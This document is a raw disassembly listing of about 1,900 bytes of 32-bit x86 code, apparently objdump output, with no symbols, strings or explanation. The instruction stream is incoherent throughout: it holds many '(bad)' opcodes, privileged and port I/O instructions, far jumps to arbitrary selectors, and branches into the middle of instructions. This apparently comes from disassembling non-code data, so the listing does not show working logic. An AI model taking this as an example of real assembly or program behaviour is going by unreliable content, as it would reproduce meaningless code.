  407acb:	repnz lds ecx,FWORD PTR [ecx+eiz*1]
  407acf:	shl    edx,0xe4
  407ad2:	add    eax,DWORD PTR [edi]
  407ad4:	fsub   QWORD PTR [ebx-0x4d6d95cd]
  407ada:	lods   eax,DWORD PTR ds:[esi]
  407adb:	pushf  
  407adc:	setb   dh
  407adf:	rcr    ebp,1
  407ae1:	pushf  
  407ae2:	xchg   ecx,eax
  407ae3:	mov    edx,0x8b394317
  407ae8:	je     0x407ad2
  407aea:	xlat   BYTE PTR ds:[ebx]
  407aeb:	nop/reserved BYTE PTR [eax-0x33]
  407aef:	xor    ch,BYTE PTR [edx+0x17bbfa68]
  407af5:	xchg   edx,eax
  407af6:	out    0x40,eax
  407af8:	push   0xf480346c
  407afd:	clc    
  407afe:	(bad)  
  407aff:	fcmove st,st(3)
  407b01:	std    
  407b02:	mov    esi,0xd942c3eb
  407b07:	mov    al,0xbb
  407b09:	add    al,0xa5
  407b0b:	pop    eax
  407b0c:	into   
  407b0d:	fcomip st,st(0)
  407b0f:	shr    DWORD PTR [esi-0x7c0fe5f4],1
  407b15:	imul   esi,eax,0xc908675d
  407b1b:	push   esp
  407b1c:	add    dh,BYTE PTR [ebp-0x64793a17]
  407b22:	pop    ecx
  407b23:	pop    ebx
  407b24:	outs   dx,BYTE PTR ds:[esi]
  407b25:	in     eax,0x24
  407b27:	inc    ecx
  407b28:	cmp    DWORD PTR [edx+ebx*1],ebx
  407b2b:	(bad)  
  407b2c:	mov    al,0xd6
  407b2e:	inc    esp
  407b2f:	std    
  407b30:	sbb    ecx,DWORD PTR [edi+0x2923aaba]
  407b36:	pop    edx
  407b37:	les    eax,FWORD PTR ds:0xc906bea4
  407b3d:	and    cl,bl
  407b3f:	pop    ss
  407b40:	pop    es
  407b41:	dec    ebx
  407b42:	loop   0x407b07
  407b44:	xor    eax,0x40f996eb
  407b49:	scas   al,BYTE PTR es:[edi]
  407b4a:	test   cl,dh
  407b4c:	or     al,0xa8
  407b4e:	call   0xc9ce4206
  407b53:	icebp  
  407b54:	sbb    al,0x32
  407b56:	aaa    
  407b57:	ins    DWORD PTR es:[edi],dx
  407b58:	pusha  
  407b59:	icebp  
  407b5a:	or     DWORD PTR [edx+ecx*4],edi
  407b5d:	pop    edx
  407b5e:	int    0x70
  407b60:	or     eax,0x309e53a3
  407b65:	aam    0xbe
  407b67:	int3   
  407b68:	xchg   edi,eax
  407b69:	popa   
  407b6a:	adc    dh,BYTE PTR [di+0x32e0]
  407b6f:	and    eax,0x2ac9ec76
  407b74:	addr16 aam 0xf1
  407b77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b78:	cmp    al,0x22
  407b7a:	mov    al,0x5a
  407b7c:	push   ecx
  407b7d:	xchg   esi,eax
  407b7e:	xchg   ebp,eax
  407b7f:	fwait
  407b80:	loopne 0x407bc9
  407b82:	and    BYTE PTR [eax+0x5254000c],dl
  407b88:	xchg   DWORD PTR [ebp+0x6231e5b6],ebp
  407b8e:	loopne 0x407b98
  407b90:	stos   DWORD PTR es:[edi],eax
  407b91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b92:	aad    0x24
  407b94:	out    dx,eax
  407b95:	fdivp  st(1),st
  407b97:	adc    eax,0x35881dff
  407b9c:	retf   
  407b9d:	sub    BYTE PTR [edx-0x7cba5f91],0x23
  407ba4:	sbb    cl,dh
  407ba6:	sub    bh,BYTE PTR [ecx+0x63cde925]
  407bac:	js     0x407bee
  407bae:	and    al,0xf9
  407bb0:	js     0x407bc3
  407bb2:	jns    0x407bee
  407bb4:	adc    DWORD PTR [ecx+ebx*8+0x204ed9ab],ebx
  407bbb:	adc    BYTE PTR [ebx+0x118d4522],0x55
  407bc2:	test   ah,al
  407bc4:	outs   dx,BYTE PTR ds:[esi]
  407bc5:	into   
  407bc6:	pop    esi
  407bc7:	cs in  al,0xf1
  407bca:	push   ecx
  407bcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bcc:	ffree  st(4)
  407bce:	xor    DWORD PTR [ebx+0x62],ecx
  407bd1:	jle    0x407b67
  407bd3:	cmp    eax,0x3182401d
  407bd8:	and    DWORD PTR [ebx+esi*8],edi
  407bdb:	sub    al,0xc0
  407bdd:	outs   dx,DWORD PTR ds:[esi]
  407bde:	cdq    
  407bdf:	retf   
  407be0:	push   esi
  407be1:	clc    
  407be2:	pop    eax
  407be3:	xor    DWORD PTR [esi],esi
  407be5:	das    
  407be6:	sub    edi,DWORD PTR [ecx+ebx*8]
  407be9:	pop    edi
  407bea:	pop    ds
  407beb:	and    BYTE PTR [ebx+edx*1+0x49],ah
  407bef:	pop    ds
  407bf0:	add    ecx,0xffffffae
  407bf3:	sub    DWORD PTR [ecx],ecx
  407bf5:	inc    DWORD PTR [ecx+0xeac30ab]
  407bfb:	xchg   bh,dl
  407bfd:	xor    al,0x1f
  407bff:	ror    dh,cl
  407c01:	sbb    eax,0x5a8b61c
  407c06:	ins    BYTE PTR es:[edi],dx
  407c07:	out    dx,eax
  407c08:	xchg   edx,eax
  407c09:	jge    0x407bd3
  407c0b:	outs   dx,DWORD PTR cs:[esi]
  407c0d:	push   ebx
  407c0e:	mov    ch,0xfc
  407c10:	call   0x4989:0x430a5a1a
  407c17:	(bad)  
  407c18:	jne    0x407c95
  407c1a:	adc    ebx,edi
  407c1c:	mov    dh,0xa2
  407c1e:	push   0x19
  407c20:	outs   dx,BYTE PTR ds:[esi]
  407c21:	jp     0x407c78
  407c23:	sbb    eax,0x189fb6fa
  407c28:	icebp  
  407c29:	and    eax,0xb7a1a207
  407c2e:	loop   0x407c72
  407c30:	add    BYTE PTR [edx-0x17],cl
  407c33:	dec    edx
  407c34:	and    eax,DWORD PTR [eax]
  407c36:	add    BYTE PTR [eax-0x5d10c7b2],dh
  407c3c:	mov    esi,DWORD PTR [ebx+0x33]
  407c3f:	(bad)  
  407c40:	sbb    BYTE PTR ds:0xf6518de6,cl
  407c46:	ja     0x407c4e
  407c48:	cmp    bh,BYTE PTR [esp+edi*2+0x4e]
  407c4c:	pop    edi
  407c4d:	jl     0x407ccb
  407c4f:	push   0x76
  407c51:	cmc    
  407c52:	int3   
  407c53:	xor    DWORD PTR [ecx+0x45],ebx
  407c56:	xchg   ebp,eax
  407c57:	mov    ebx,0xffd0e3f1
  407c5c:	cli    
  407c5d:	sbb    al,0xc6
  407c5f:	sbb    BYTE PTR [esp+eiz*2-0x54184a39],dl
  407c66:	sbb    al,0x47
  407c68:	sbb    eax,0xdc98b84d
  407c6d:	rol    DWORD PTR [ebx+0x7],cl
  407c70:	cmp    al,BYTE PTR [eax+0x4b694908]
  407c76:	(bad)  
  407c77:	cdq    
  407c78:	or     esi,DWORD PTR [ebx+0x7f]
  407c7b:	mov    bl,0x6a
  407c7d:	minps  xmm1,XMMWORD PTR [ebx]
  407c80:	inc    edi
  407c81:	sub    ecx,DWORD PTR [ecx]
  407c83:	jmp    0xce4f:0x290c4536
  407c8a:	adc    edi,ebp
  407c8c:	push   ebp
  407c8d:	(bad)  
  407c8e:	sbb    bh,BYTE PTR [ebx]
  407c90:	sub    bl,ah
  407c92:	outs   dx,DWORD PTR ds:[esi]
  407c93:	add    edi,DWORD PTR [ecx]
  407c95:	fldenv [edi]
  407c97:	adc    al,0x53
  407c99:	add    al,0x9e
  407c9b:	sbb    ebx,DWORD PTR [esi]
  407c9d:	xchg   edi,eax
  407c9e:	xchg   BYTE PTR [edx+ecx*8+0x4e69dd7b],cl
  407ca5:	add    DWORD PTR [ebx+ebx*4-0xd4343de],0xf
  407cad:	push   ss
  407cae:	test   DWORD PTR [edi+ebp*4+0x46],edi
  407cb2:	loope  0x407c9d
  407cb4:	xor    esi,0xd52ae444
  407cba:	fucomp st(1)
  407cbc:	outs   dx,DWORD PTR ds:[esi]
  407cbd:	pop    ebx
  407cbe:	mov    al,ds:0xc4de2125
  407cc3:	sub    BYTE PTR [ebx-0x4a],dh
  407cc6:	(bad)  [ebx]
  407cc8:	shl    DWORD PTR [ebx+0x510e5509],1
  407cce:	add    ebp,esp
  407cd0:	sub    BYTE PTR [ebp+0x5e],ch
  407cd3:	push   ebx
  407cd4:	je     0x407d13
  407cd6:	leave  
  407cd7:	adc    DWORD PTR [esi+0x57473ee5],edx
  407cdd:	cmp    eax,0x822960c1
  407ce2:	pop    esp
  407ce3:	stos   BYTE PTR es:[edi],al
  407ce4:	add    cl,BYTE PTR [ebx]
  407ce6:	adc    eax,0x4b473e83
  407ceb:	(bad)  
  407cec:	mov    ah,0xb3
  407cee:	and    DWORD PTR [edi-0x6fa71a5a],ebx
  407cf4:	dec    edi
  407cf5:	and    cl,dl
  407cf7:	call   0xabde7041
  407cfc:	lds    esi,FWORD PTR [edi]
  407cfe:	cmc    
  407cff:	out    dx,eax
  407d00:	pusha  
  407d01:	ss adc al,0x91
  407d04:	fwait
  407d05:	sbb    bl,BYTE PTR [edi]
  407d07:	(bad)
  407d0a:	or     bh,BYTE PTR [ebx+0x3f]
  407d0d:	cmp    edi,DWORD PTR [edx+ebx*2-0x3f43ae97]
  407d14:	ins    DWORD PTR es:[edi],dx
  407d15:	push   es
  407d16:	loopne 0x407d24
  407d18:	mov    edi,0x2c0088ac
  407d1d:	push   eax
  407d1e:	in     al,0x7b
  407d20:	adc    al,0x82
  407d22:	clc    
  407d23:	in     al,0xb8
  407d25:	(bad)  
  407d26:	sbb    BYTE PTR [edx+0x71],ah
  407d29:	jmp    0xd7206027
  407d2e:	mov    edi,eax
  407d30:	out    0x76,al
  407d32:	xchg   BYTE PTR [ebp+0x2f],ah
  407d35:	xor    eax,0xa4a3da71
  407d3a:	lods   al,BYTE PTR ds:[esi]
  407d3b:	and    al,0x97
  407d3d:	into   
  407d3e:	or     BYTE PTR [ecx+0x46dd8978],bl
  407d44:	sbb    al,BYTE PTR [eax-0x7a88575c]
  407d4a:	push   0x9d7c93e4
  407d4f:	dec    esp
  407d50:	cli    
  407d51:	lods   al,BYTE PTR ds:[esi]
  407d52:	sahf   
  407d53:	jecxz  0x407d14
  407d55:	dec    esp
  407d56:	das    
  407d57:	in     eax,0xcd
  407d59:	je     0x407d31
  407d5b:	push   edi
  407d5c:	sbb    al,BYTE PTR [ebp-0x32]
  407d5f:	mov    eax,ds:0xaa8ae0e3
  407d65:	call   0xda1daffe
  407d6a:	rcr    BYTE PTR [ebp+0x5],0x8a
  407d6e:	jl     0x407d41
  407d70:	dec    esp
  407d71:	cli    
  407d72:	or     BYTE PTR [ebx+0x22248aad],0xa4
  407d79:	ins    BYTE PTR es:[edi],dx
  407d7a:	pop    esp
  407d7b:	sbb    ch,BYTE PTR [ecx]
  407d7d:	pop    ss
  407d7e:	aam    0x55
  407d80:	push   eax
  407d81:	adc    BYTE PTR [ebx-0x41],al
  407d84:	sbb    ah,ah
  407d86:	mov    ebp,0xf78862f6
  407d8b:	lods   al,BYTE PTR ds:[esi]
  407d8c:	call   0xe7b13991
  407d91:	sbb    al,0x68
  407d93:	add    ebp,DWORD PTR [edx]
  407d95:	test   BYTE PTR [ebx],al
  407d97:	adc    ch,dl
  407d99:	xchg   ebp,eax
  407d9a:	cmp    DWORD PTR [edx-0x3d],eax
  407d9d:	sub    DWORD PTR [ecx+0x2c],esp
  407da0:	int    0x84
  407da2:	test   bh,bl
  407da4:	mov    al,BYTE PTR [ecx+edx*1-0x3f]
  407da8:	ds enter 0x66e9,0x25
  407dad:	hlt    
  407dae:	xor    eax,0x2f0200b1
  407db3:	dec    edi
  407db4:	jmp    0x37f19cb6
  407db9:	ret    
  407dba:	das    
  407dbb:	jg     0x407dea
  407dbd:	add    al,0xee
  407dbf:	jb     0x407d41
  407dc1:	je     0x407dbc
  407dc3:	xor    eax,0xfa7e282c
  407dc8:	sahf   
  407dc9:	add    BYTE PTR [ecx-0x7f4c8fac],ch
  407dcf:	shl    BYTE PTR [ebx+0x77],1
  407dd2:	and    cl,bl
  407dd4:	std    
  407dd5:	mov    ds:0x785546d2,al
  407dda:	outs   dx,DWORD PTR ds:[esi]
  407ddb:	mov    esp,0x372216f8
  407de0:	jecxz  0x407de2
  407de2:	xor    DWORD PTR [eax+0x67790e8d],eax
  407de8:	xchg   esi,eax
  407de9:	stos   DWORD PTR es:[edi],eax
  407dea:	(bad)  
  407dec:	test   DWORD PTR [edi],esp
  407dee:	ds jp  0x407db0
  407df1:	lods   eax,DWORD PTR ds:[esi]
  407df2:	jmp    0x407d85
  407df4:	call   0xf651:0x4a8c44f8
  407dfb:	call   0x4cee:0x8a995d4
  407e02:	scas   al,BYTE PTR es:[edi]
  407e03:	sub    DWORD PTR [edx+edi*1],ebx
  407e06:	jp     0x407d95
  407e08:	mov    ds:0x231549d8,eax
  407e0d:	test   BYTE PTR [ebp+0x2d],al
  407e10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e11:	jl     0x407e67
  407e13:	sti    
  407e14:	mov    ah,0x17
  407e16:	jnp    0x407e54
  407e18:	mov    edi,0x327c7f41
  407e1d:	iret   
  407e1e:	sbb    eax,0xccf7aa9d
  407e23:	fld    TBYTE PTR [edx-0x6cd89500]
  407e29:	xchg   ecx,eax
  407e2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e2b:	(bad)  
  407e2c:	fdiv   DWORD PTR [eax+0x19442b91]
  407e32:	sub    bl,BYTE PTR [ecx-0x38e1d6a0]
  407e38:	inc    edi
  407e39:	mov    fs,WORD PTR [ebx+0x61d32b30]
  407e3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e40:	sub    al,0x8
  407e42:	or     eax,0x52fb3202
  407e47:	and    bl,bl
  407e49:	cmp    edx,DWORD PTR [eax-0x3f]
  407e4c:	js     0x407e31
  407e4e:	sbb    al,0x68
  407e50:	call   0x538008ec
  407e55:	sbb    ebp,esp
  407e57:	or     al,0xe0
  407e59:	outs   dx,BYTE PTR ds:[esi]
  407e5a:	mov    BYTE PTR [ecx-0x24],bh
  407e5d:	ret    0xd3b5
  407e60:	dec    ebx
  407e61:	popf   
  407e62:	rcl    BYTE PTR [esi-0x2914dae6],cl
  407e68:	push   ebx
  407e69:	imul   edx,esi,0xa63b3f09
  407e6f:	push   ecx
  407e70:	jmp    0x407eed
  407e72:	mov    ds:0xa4130f15,eax
  407e77:	jle    0x407e90
  407e79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e7a:	fbstp  TBYTE PTR [eax-0x5f]
  407e7d:	inc    ebp
  407e7e:	aaa    
  407e7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e80:	fdivr  st(2),st
  407e82:	scas   al,BYTE PTR es:[edi]
  407e83:	mov    ?,edi
  407e85:	mov    eax,0xe324a7ba
  407e8a:	xor    ebx,DWORD PTR [esp+esi*4+0x4c]
  407e8e:	mov    eax,0xe3b40eb3
  407e93:	inc    edi
  407e94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e95:	cs jmp 0x407e71
  407e98:	aaa    
  407e99:	mov    dh,0xc6
  407e9b:	in     eax,dx
  407e9c:	daa    
  407e9d:	mov    al,0x4d
  407e9f:	xlat   BYTE PTR ds:[ebx]
  407ea0:	jle    0x407ea1
  407ea2:	add    eax,0xefaa5cca
  407ea7:	imul   ebx,DWORD PTR [ebx-0x8],0xabe3f651
  407eae:	push   edi
  407eaf:	lea    esi,[edx+0x17]
  407eb2:	push   ebp
  407eb3:	push   esi
  407eb4:	fld    DWORD PTR [ecx]
  407eb6:	sub    DWORD PTR [ecx+0x599e5676],eax
  407ebc:	les    edx,FWORD PTR [edi+0x6e]
  407ebf:	cli    
  407ec0:	cmp    ebp,DWORD PTR [edi+0x2f1e0d0d]
  407ec6:	pop    eax
  407ec7:	jl     0x407e65
  407ec9:	enter  0xf782,0xff
  407ecd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ece:	pop    es
  407ecf:	mov    BYTE PTR [esi],bl
  407ed1:	fild   QWORD PTR [edi+0x55]
  407ed4:	inc    ebx
  407ed5:	inc    ebp
  407ed6:	ficomp WORD PTR [edi]
  407ed8:	xor    al,0x1d
  407eda:	mov    ebp,ecx
  407edc:	push   eax
  407edd:	dec    edx
  407ede:	sub    eax,0x2a554bd4
  407ee3:	pop    edx
  407ee4:	inc    ebx
  407ee5:	adc    bl,BYTE PTR [eax]
  407ee7:	push   0x8d15d64b
  407eec:	into   
  407eed:	shl    DWORD PTR [edx-0x60c96e34],cl
  407ef3:	cmp    BYTE PTR [edx],al
  407ef5:	jge    0x407f00
  407ef7:	mov    ebx,0xa7661326
  407efc:	out    0xb8,al
  407efe:	sbb    ch,BYTE PTR [eax+0x7c]
  407f01:	adc    eax,0x6feb7ca2
  407f06:	jae    0x407e89
  407f08:	fdivr  st(4),st
  407f0a:	inc    esi
  407f0b:	ret    0xf31a
  407f0e:	add    BYTE PTR [ebx+0x4ea44eac],ah
  407f14:	or     dl,BYTE PTR [eax]
  407f16:	dec    ebp
  407f17:	retf   
  407f18:	je     0x407f60
  407f1a:	retf   
  407f1b:	jl     0x407f2f
  407f1d:	pop    ss
  407f1e:	adc    eax,0x10e776e2
  407f23:	jmp    0x407f89
  407f25:	cmp    DWORD PTR [eax-0x688c8d3a],ebx
  407f2b:	jae    0x407f3e
  407f2d:	pusha  
  407f2e:	cs adc al,dl
  407f31:	not    eax
  407f33:	inc    esi
  407f34:	dec    eax
  407f35:	push   ds
  407f36:	fbld   TBYTE PTR [esi-0x147edf74]
  407f3c:	imul   eax,DWORD PTR [eax],0xe15db198
  407f42:	mov    ds,eax
  407f44:	popa   
  407f45:	je     0x407f72
  407f47:	inc    eax
  407f48:	mov    ah,0xf4
  407f4a:	sub    BYTE PTR [ecx+0x2500c884],cl
  407f50:	pop    edx
  407f51:	shl    DWORD PTR [ecx+0x1b527e67],1
  407f57:	jnp    0x407f0f
  407f59:	daa    
  407f5a:	iret   
  407f5b:	das    
  407f5c:	popa   
  407f5d:	jge    0x407fc2
  407f5f:	add    eax,0xd484f74d
  407f64:	jbe    0x407f2a
  407f66:	lock fstp DWORD PTR [ecx-0x5b]
  407f6a:	xlat   BYTE PTR ds:[ebx]
  407f6b:	jge    0x407f62
  407f6d:	das    
  407f6e:	ficom  DWORD PTR [ebx-0x577fa92c]
  407f74:	push   ecx
  407f75:	mov    ebp,DWORD PTR [esi-0x7ee63980]
  407f7b:	mov    edi,0xc5ee939b
  407f80:	mov    ds:0x4b9257bf,eax
  407f85:	sar    dl,1
  407f87:	shl    eax,cl
  407f89:	(bad)  
  407f8a:	cdq    
  407f8b:	gs sar edx,cl
  407f8e:	js     0x407fd9
  407f90:	inc    esp
  407f91:	push   cs
  407f92:	add    BYTE PTR [eax],ch
  407f94:	lds    ebx,FWORD PTR [edx+0x6f]
  407f97:	dec    edx
  407f98:	fidivr WORD PTR [ebp-0x2c]
  407f9b:	cld    
  407f9c:	xchg   ecx,eax
  407f9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f9e:	lahf   
  407f9f:	adc    BYTE PTR [ecx-0x5],bl
  407fa2:	fwait
  407fa3:	jmp    0x622f:0xd8cc34f3
  407faa:	lds    edi,FWORD PTR [ebx+0x243d4d69]
  407fb0:	cmp    eax,0xe23ae4c4
  407fb5:	pusha  
  407fb6:	mov    esp,0xd6e6b57
  407fbb:	dec    esi
  407fbc:	es xchg esp,eax
  407fbe:	ror    DWORD PTR [ebp-0x71],1
  407fc1:	cmp    al,0x24
  407fc3:	mov    bh,0x74
  407fc5:	mov    ebp,0x9d2ff36
  407fca:	pop    DWORD PTR [eax+0x2928496a]
  407fd0:	int    0x2d
  407fd2:	or     DWORD PTR [ebx-0x2c],esi
  407fd5:	jne    0x407fe0
  407fd7:	inc    ebx
  407fd8:	xchg   edi,eax
  407fd9:	(bad)  
  407fda:	sbb    BYTE PTR [ebp*8+0x147f76fc],ah
  407fe1:	fldenv [ebx-0x51062bb6]
  407fe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fe8:	int    0x83
  407fea:	in     eax,0x33
  407fec:	js     0x407ff8
  407fee:	pop    esp
  407fef:	das    
  407ff0:	mov    esp,0x9dad7a57
  407ff5:	jp     0x407ffa
  407ff7:	xchg   DWORD PTR [ebp+0x243bb4d5],edi
  407ffd:	push   eax
  407ffe:	and    al,0x1c
  408000:	outs   dx,BYTE PTR ds:[esi]
  408001:	pop    es
  408002:	fst    QWORD PTR [edx]
  408004:	dec    ebp
  408005:	ret    
  408006:	sbb    eax,0xfdc8d7b8
  40800b:	neg    DWORD PTR [edx-0x19de04a4]
  408011:	(bad)  
  408012:	imul   ebp,DWORD PTR [esi],0x99b07d4f
  408018:	js     0x407ff6
  40801a:	fadd   DWORD PTR [esi]
  40801c:	and    al,0xb3
  40801e:	(bad)  
  40801f:	(bad)  
  408020:	cmp    cl,al
  408022:	xlat   BYTE PTR ds:[ebx]
  408023:	add    BYTE PTR [ebp-0x16],ah
  408026:	sbb    al,0xba
  408028:	mov    ds:0x2109d72a,eax
  40802d:	mov    esi,DWORD PTR [ebx]
  40802f:	xor    BYTE PTR [edi+0x24],bl
  408032:	mov    DWORD PTR [ecx-0x78],esi
  408035:	sub    eax,0xfba77302
  40803a:	cwde   
  40803b:	sti    
  40803c:	xor    eax,0x74ebf409
  408041:	fist   DWORD PTR [ecx-0x39e8401f]
  408047:	fadd   DWORD PTR [ebp-0x2b201040]
  40804d:	sub    BYTE PTR [edi],bl
  40804f:	ror    DWORD PTR [edi+0x1],cl
  408052:	ret    0x3dbe
  408055:	faddp  st(1),st
  408057:	mov    edx,ecx
  408059:	outs   dx,DWORD PTR ds:[esi]
  40805a:	cwde   
  40805b:	and    dl,BYTE PTR [ebp-0x76]
  40805e:	jne    0x408024
  408060:	sar    BYTE PTR ds:0x4327aeff,cl
  408066:	fsub   DWORD PTR [esi+0x0]
  408069:	pop    ebp
  40806a:	inc    ecx
  40806b:	lock outs dx,BYTE PTR ds:[esi]
  40806d:	jbe    0x4080ad
  40806f:	pop    ebp
  408070:	lods   eax,DWORD PTR ds:[esi]
  408071:	adc    edi,DWORD PTR [eax]
  408073:	pop    esp
  408074:	cmp    BYTE PTR [ecx+ebx*8],dl
  408077:	mov    ah,0x8b
  408079:	add    BYTE PTR ss:[edx+0x28],ah
  40807d:	rcl    BYTE PTR [eax+ebp*8+0x6],1
  408081:	pop    ss
  408082:	lds    esp,FWORD PTR [edx-0x4662322]
  408088:	cmp    cl,BYTE PTR [esp+ebp*4-0xa695721]
  40808f:	retf   
  408090:	jnp    0x40810d
  408092:	jmp    0x408030
  408094:	shl    DWORD PTR [ebx-0x629fb758],0x70
  40809b:	mov    DWORD PTR [edi+ebp*2],ebp
  40809e:	mov    ds:0x95dfc79f,eax
  4080a3:	pop    ebp
  4080a4:	cmp    DWORD PTR [ecx+0x7d],esp
  4080a7:	jno    0x40811f
  4080a9:	fwait
  4080aa:	out    dx,eax
  4080ab:	clc    
  4080ac:	add    al,0x6d
  4080ae:	loope  0x4080c3
  4080b0:	add    BYTE PTR [eax+ebx*8+0x12],ch
  4080b4:	add    eax,0xf6ea214b
  4080b9:	push   edi
  4080ba:	mov    BYTE PTR [edi+0x565a592e],ah
  4080c0:	dec    eax
  4080c1:	repnz xchg edi,eax
  4080c3:	pop    ss
  4080c4:	mov    esi,DWORD PTR [ebp-0xa]
  4080c7:	adc    cl,BYTE PTR [ecx-0x3bbd1b84]
  4080cd:	xor    eax,0x6dff2255
  4080d2:	hlt    
  4080d3:	xor    eax,0x6f26decd
  4080d8:	loope  0x408092
  4080da:	xchg   ebp,eax
  4080db:	retf   0xf6b3
  4080de:	jmp    0x9e36666e
  4080e3:	jmp    0x408145
  4080e5:	retf   
  4080e6:	push   ebx
  4080e7:	mov    gs:0x57befe3b,al
  4080ed:	cmp    ebp,ebx
  4080ef:	lods   eax,DWORD PTR cs:[esi]
  4080f1:	test   ch,ah
  4080f3:	dec    ebp
  4080f4:	ret    0x8a2f
  4080f7:	(bad)
  4080fa:	and    eax,0x3b9aa80e
  4080ff:	in     eax,0x67
  408101:	dec    esp
  408102:	push   ecx
  408103:	mov    eax,0x263b6ddc
  408108:	dec    ebx
  408109:	pop    esi
  40810a:	pop    esi
  40810b:	ret    
  40810c:	pop    esp
  40810d:	cmp    edi,DWORD PTR [ebx+0x65350e2d]
  408113:	push   ebx
  408114:	pushf  
  408115:	xor    dh,BYTE PTR [esi]
  408117:	mov    al,0xd
  408119:	data16 ins BYTE PTR es:[edi],dx
  40811b:	lea    bx,[edx-0x4e]
  40811f:	pop    ecx
  408120:	push   edx
  408121:	xor    eax,0x2f3e542c
  408126:	aaa    
  408127:	(bad)  
  408128:	in     al,dx
  408129:	fsub   QWORD PTR [esi]
  40812b:	or     DWORD PTR [ebp-0x4],ecx
  40812e:	cmp    al,0x17
  408130:	test   DWORD PTR [edi-0x28],0x2860118b
  408137:	mov    edx,0x73ab8925
  40813c:	leave  
  40813d:	shr    DWORD PTR [ebx],1
  40813f:	jo     0x4080f9
  408141:	inc    esi
  408142:	sub    al,0x9b
  408144:	outs   dx,BYTE PTR ds:[esi]
  408145:	fild   WORD PTR [edi+edx*8-0x7345ef06]
  40814c:	popa   
  40814d:	lods   al,BYTE PTR ds:[esi]
  40814e:	pop    esp
  40814f:	(bad)  [edi]
  408151:	popf   
  408152:	gs xor eax,0x8bf5e9bd
  408158:	aas    
  408159:	retf   0x70fe
  40815c:	pop    edi
  40815d:	outs   dx,BYTE PTR ds:[esi]
  40815e:	dec    ecx
  40815f:	add    dh,BYTE PTR [ecx+ecx*8-0x3b7c82ea]
  408166:	add    eax,0x6d362fe1
  40816b:	inc    edx
  40816c:	lods   al,BYTE PTR ds:[esi]
  40816d:	sti    
  40816e:	pop    ecx
  40816f:	xchg   ebp,eax
  408170:	mov    DWORD PTR [ebp-0x4196f686],0x935a8476
  40817a:	mov    ds:0xa8395e9f,al
  40817f:	adc    al,ah
  408181:	adc    dl,al
  408183:	fiadd  DWORD PTR [ebp-0x222e6e08]
  408189:	push   esp
  40818a:	ins    DWORD PTR es:[edi],dx
  40818b:	and    DWORD PTR [ecx],edx
  40818d:	add    eax,0x3f022816
  408192:	scas   eax,DWORD PTR es:[edi]
  408193:	sahf   
  408194:	ret    0x4124
  408197:	dec    esi
  408198:	ror    ebp,0x2b
  40819b:	fld    QWORD PTR [ebx]
  40819d:	ret    0x248d
  4081a0:	test   al,0x76
  4081a2:	push   ss
  4081a3:	xchg   esp,eax
  4081a4:	neg    DWORD PTR [eax+0x59fada45]
  4081aa:	jae    0x408216
  4081ac:	aad    0xe
  4081ae:	mov    ds:0x6fdf00ef,al
  4081b3:	outs   dx,BYTE PTR ds:[esi]
  4081b4:	mov    ecx,0xaf1c86d7
  4081b9:	xchg   ebp,eax
  4081ba:	push   ecx
  4081bb:	jle    0x4081b8
  4081bd:	dec    esp
  4081be:	icebp  
  4081bf:	xor    al,0xc6
  4081c1:	or     eax,0x93628df3
  4081c6:	not    BYTE PTR [eax-0x77]
  4081c9:	push   ds
  4081ca:	das    
  4081cb:	push   cs
  4081cc:	jmp    0x7c0dd7ed
  4081d1:	test   eax,0xc4895d66
  4081d6:	out    0x30,al
  4081d8:	stc    
  4081d9:	xchg   edx,eax
  4081da:	aad    0xc4
  4081dc:	imul   ebp,DWORD PTR [ebx],0x14
  4081df:	cmp    ch,BYTE PTR [ebx-0x7cabe1a5]
  4081e5:	inc    edx
  4081e6:	mov    bh,0xc5
  4081e8:	cmp    al,0xc2
  4081ea:	leave  
  4081eb:	sahf   
  4081ec:	loopne 0x4081f7
  4081ee:	(bad)  
  4081f0:	clc    
  4081f1:	ins    DWORD PTR es:[edi],dx
  4081f2:	test   BYTE PTR [ebp+0x376bfdf7],dh
  4081f8:	in     al,0xa3
  4081fa:	add    ecx,ecx
  4081fc:	mov    DWORD PTR [ebx-0x797637bc],ebp
  408202:	mov    DWORD PTR [ebp+0x62],esp
  408205:	mov    cl,0x5
  408207:	jno    0x408257
  408209:	jae    0x4081cc
  40820b:	and    al,0x7
  40820d:	cmp    dl,BYTE PTR [esi]
  40820f:	xchg   esi,eax
  408210:	pop    ss
  408211:	ret    
  408212:	das    
  408213:	xchg   ebx,eax
  408214:	inc    ebp
  408215:	pop    ds
  408216:	arpl   WORD PTR [ebx+0x49d90393],sp
  40821c:	pop    ecx
  40821d:	(bad)  
  40821e:	xor    eax,0x805c585c
  408223:	retf   0x849c
  408226:	adc    eax,0x203ae475
  40822b:	mov    bh,0xf2
  40822d:	add    al,0x32
  40822f:	pop    esp
  408230:	cmp    cl,0x16
  408233:	stos   DWORD PTR es:[edi],eax
  408234:	sbb    ah,BYTE PTR [edi+0x13fb134f]
  40823a:	mov    dh,0x51
  40823c:	sahf   
  40823d:	imul   edi,DWORD PTR [edx+0x78],0xf214bb39
  408244:	aam    0xc1
  408246:	test   cl,cl
  408248:	jmp    FWORD PTR [ecx-0x80]
  40824b:	pop    edi
  40824c:	jae    0x408248
  40824e:	adc    DWORD PTR ds:0x8d5724d9,ebx
  408254:	pop    ss
  408255:	inc    ecx
  408256:	pop    ebp
  408257:	push   eax
  408258:	mov    cl,0xfe
  40825a:	inc    esi
  40825b:	ins    DWORD PTR es:[edi],dx
  40825c:	sbb    esp,ebp
  40825e:	shl    BYTE PTR [esi+0x4e15c5cf],cl
  408264:	dec    eax
  408265:	into   
  408266:	adc    ch,dh
  408268:	shl    BYTE PTR ds:0x24588d27,0xcf
  40826f:	aaa    
  408270:	adc    dh,BYTE PTR [esi-0x48]
  408273:	add    ch,BYTE PTR [ecx-0x27]
  408276:	jnp    0x408245
  408278:	cmp    eax,0x3f9c3103
